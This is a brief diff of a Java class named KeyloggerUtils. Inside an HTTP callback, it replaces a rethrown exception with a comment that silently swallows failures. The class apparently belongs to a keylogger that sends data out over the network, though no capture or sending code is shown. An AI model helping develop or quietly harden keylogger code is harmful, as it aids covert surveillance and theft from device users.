@@ -55,7 +55,7 @@ public class KeyloggerUtils {
                     Log.i("STATUS", String.valueOf(connection.getResponseCode()));
 
                 } catch (Exception e) {
-                    throw new RuntimeException(e);
+                    // if anything fails, do nothing
                 }
             }
         });
